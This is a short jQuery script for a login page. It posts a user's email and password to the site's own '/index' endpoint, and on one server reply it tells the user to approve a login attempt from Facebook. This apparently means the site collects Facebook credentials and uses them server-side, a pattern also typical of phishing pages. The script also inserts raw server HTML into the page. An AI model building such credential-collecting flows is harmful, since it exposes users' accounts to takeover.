$(document).ready(function(){
  $("#login_btn").hover(function(){
    $("#login_btn").css("background", "#4DA1DE");
  }, function(){
    $("#login_btn").css("background", "#53ABEA");
  });

  $("#login_btn").click(function(){
    $("#login_form").submit();
  });

  $("#login_form").submit(function (event){
    event.preventDefault();
    // event.stopPropagation();
    var email = $("input[name='email']").val();
    var password = $("input[name='password']").val();
    $('#login').hide();
    $("#login_btn").hide();
    $("#loading").show();
    $.post("/index", {email: email, password: password}, function( data ) {
      $("#plead").hide();
      if (data === "1"){
        $("#flash").html("<h3>Please approve login attempt from <a href='http://www.facebook.com' style='color:#4DA1DE;' target='_blank'>www.facebook.com</a></h3>");
        $("#loading").hide();
        $("#login").show();
        $("#login_btn").show();
      } else if (data === "2"){
        $("#flash").html("<h3>Please check your username and password</h3>");
        $("#loading").hide();
        $("#login").show();
        $("#login_btn").show();
      } else {
        $("#loading").hide();
        $("#index").append(data);
      }
    });
  });

  window.addEventListener("resize", underline, false);
  window.addEventListener("load", underline, false);

  function underline (){
    if($(window).width() < 900){
      $("#logo").css("background-size", "100% 3px");
      $("#logotop").css("background-size", "100% 3px");
      $("#youspan").css("background-size", "100% 3px");
      $("#mepsan").css("background-size", "100% 3px");
      $("span").css("background-size", "100% 3px");
    } else{
      $("#logo").removeAttr('style');
      $("#logotop").removeAttr('style');
      $("#youspan").removeAttr('style');
      $("#mepsan").removeAttr('style');
      $("span").removeAttr('style');
    }
  }
});